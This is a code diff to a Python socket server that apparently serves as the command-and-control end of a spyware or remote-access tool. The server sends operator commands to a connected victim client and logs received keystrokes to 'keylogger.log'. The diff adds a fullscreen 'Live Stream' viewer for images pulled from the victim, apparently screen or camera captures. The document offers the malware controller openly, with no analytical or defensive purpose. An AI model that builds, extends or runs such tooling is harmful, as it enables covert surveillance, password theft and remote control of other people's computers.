@@ -2,6 +2,10 @@ import socket
 from threading import Thread
 import sys
 import os
+import cv2
+import time
+
+FOLDER = "img"
 
 HOST = "0.0.0.0"
 PORT = 5001
@@ -15,6 +19,10 @@ try:
 except KeyboardInterrupt:
     exit()
 print("Connected:", addr)
+def get_images():
+    files = [f for f in os.listdir(FOLDER) if f.endswith(".jpg")]
+    files.sort(key=lambda x: os.path.getctime(os.path.join(FOLDER, x)))
+    return files
 def send():
     while True:
         try:
@@ -23,9 +31,8 @@ def send():
             conn.sendall(b"cmd " + cmd.encode())
         except KeyboardInterrupt:
             exit()
-        except:
-            print("Connection lost")
-            conn, addr = server.accept()
+        except Exception as e:
+            print("Connection lost", e)
 import struct
 
 def recv_exact(sock, size):
@@ -36,8 +43,35 @@ def recv_exact(sock, size):
             return None
         data += chunk
     return data
+def resize_to_window(img, max_width=1000, max_height=700):
+    h, w = img.shape[:2]
 
+    scale = min(max_width / w, max_height / h)
+    if scale < 1:
+        img = cv2.resize(img, (int(w * scale), int(h * scale)))
 
+    return img
+def show():
+    cv2.namedWindow("Live Stream", cv2.WINDOW_FULLSCREEN)
+    while True:
+        images = get_images()
+
+        if images:
+            latest = images[-1]
+            path = os.path.join(FOLDER, latest)
+
+            frame = cv2.imread(path)
+
+            if frame is not None:
+                frame = resize_to_window(frame)
+                cv2.imshow("Live Stream", frame)
+
+        if cv2.waitKey(100) & 0xFF == ord('q'):
+            break
+
+        time.sleep(0.2)
+
+    cv2.destroyAllWindows()
 def check():
     while True:
         try:
@@ -80,7 +114,6 @@ def check():
                 try:
                     text = data.decode("utf-8", errors="ignore")
                     key_data = text
-                    print(key_data)
                     with open("keylogger.log", "a", encoding="utf-8") as file:
                         file.write(key_data + "\n")
 
@@ -97,6 +130,7 @@ def check():
             break
 try:
     Thread(target=check, daemon=True).start()
+    Thread(target=show, daemon=True).start()
     send()
 except KeyboardInterrupt:
     exit()
